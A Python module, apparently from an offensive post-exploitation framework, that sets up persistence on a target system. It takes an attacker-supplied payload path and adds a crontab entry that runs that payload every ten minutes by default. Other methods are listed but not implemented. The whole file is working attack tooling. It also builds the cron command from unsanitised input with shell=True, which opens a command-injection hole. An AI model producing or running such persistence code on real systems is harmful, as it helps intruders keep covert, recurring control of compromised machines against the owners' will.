import os
import subprocess
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/persistence',
        'description': 'Establish persistence on a target system.',
        'options': {
            'METHOD': 'Persistence method (cron, startup, service) [default: cron]',
            'PAYLOAD_PATH': 'Path to the payload to execute periodically',
            'CRON_TIME': 'Cron schedule [default: */10 * * * *] (every 10 minutes)'
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        method = self.framework.options.get('METHOD', 'cron')
        payload_path = self.framework.options.get('PAYLOAD_PATH')
        cron_time = self.framework.options.get('CRON_TIME', '*/10 * * * *')

        if not payload_path:
            console.print("[red][!] PAYLOAD_PATH is required.[/red]")
            return

        abs_path = os.path.abspath(payload_path)
        
        if method == 'cron':
            console.print(f"[*] Establishing persistence via [cyan]Cronjob[/cyan]...")
            try:
                # Add cronjob
                cron_cmd = f"{cron_time} {abs_path}"
                (subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=True))
                console.print(f"[green][+] Cronjob added: {cron_cmd}[/green]")
                log_action(f"Persistence established via cron for {abs_path}")
            except Exception as e:
                console.print(f"[red][!] Failed to add cronjob: {e}[/red]")
        else:
            console.print(f"[yellow][!] Method {method} is not yet implemented.[/yellow]")
